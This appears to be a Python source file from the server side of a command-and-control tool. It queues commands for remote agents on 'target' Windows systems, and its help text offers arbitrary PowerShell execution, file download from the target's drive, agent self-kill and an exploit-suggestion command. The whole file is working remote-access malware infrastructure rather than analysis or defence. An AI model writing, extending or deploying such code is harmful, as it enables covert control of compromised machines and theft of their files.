from ..model.model import Command, db

class CommandFinal:
    def __init__(self, uid, command, time_added, pid, procname):
        self.prefshell = "cmd"
        self.uid = uid
        self.command = command
        self.time = time_added
        self.pid = pid
        print("COMmand to execute:  " + command)
        self.shellPref(command)

        print("PRefshell: " + self.prefshell)
        print("Command final: " + self.command)
        self.addCommand(self.uid, self.command, self.prefshell, self.pid)

    def procnameStriped(self, str, procname):
        if procname in str:
            str.replace(procname, f"{procname} <---- You")

    def allowed(self):
        return ["cmd", "powershell"]
    
    def commands(self):
        return ["systemexploitsuggest", "cd", "list", "cmd"]
    
    def commandExec(self, command, pid):
        if command ==  "selfkill":
            return f"taskkill /F /IM {pid}"
        if "download" in command:
            cmd_new  = command.replace("download ", "")
            return cmd_new
        else:
            return command
    def commandsAction(self, command, pid):
        if command.startswith("list"):
            print("COmmand -> lisg")
            # time1 = time()
            return self.list(pid)
        if command.startswith("remove"):
            return "remove"
        else:
            return "Loading.."

    def addCommand(self, uid, command, shellpref, pid):
        command_add = Command(
                target_uid=uid,
                command=self.commandExec(command, pid),
                command_par=shellpref,

                command_added=self.time,

                command_response=self.commandsAction(command, pid)
        )
        if command == "list":
            command_add.command_executed =  self.time
            command_add.command_received =  self.time
        elif command == "selfkill":
            command_add.command_executed =  self.time
            command_add.command_received =  self.time
        elif command == "remove":
            command_add.command_executed =  self.time
            command_add.command_received =  self.time
        else:
            command_add.command_executed =  "Loading.."
            command_add.command_received =  "Loading.."
            

        db.session.merge(command_add)
        db.session.flush()
        # db.session.add(command_add)
        db.session.commit()

        print("Added Command")

    def update(self, shell):
        self.prefshell = shell

    def shellPref(self, command): # FUnction to split up if the shell will be CMD, OR PS1
        if "cd" in self.command:
            print("Chaning!.")
            self.prefshell = "cd"
        elif "download" in self.command:
            self.prefshell = "download"
        else:
            pass
                # print(command)

### Commands that are not stock in shell Os.exec command in golang shell.
    def list(self, pid):
        return f"""`Note` -> The info command are just examples, you can execute every command that powershell can execute  
Type        Command                 Result                                                                                          
----        -------                 ------                      
                    
Info        ps                      Returns an list of active processes on the system   
Info        whoami                  Returns the user of the system
Info        ipconfig                Returns info about the IP address of the agent

Server      list                    Returns an list of commands
Server      remove                  Removes client from database
Agent       cd Folderpath           Change directory on target systems folder
       
Agent       download File           Downloads file from targets drive, only specify the file not include the dir    
Agent       selfkill                Kills current process using taskkill and PID: {pid}
"""

                
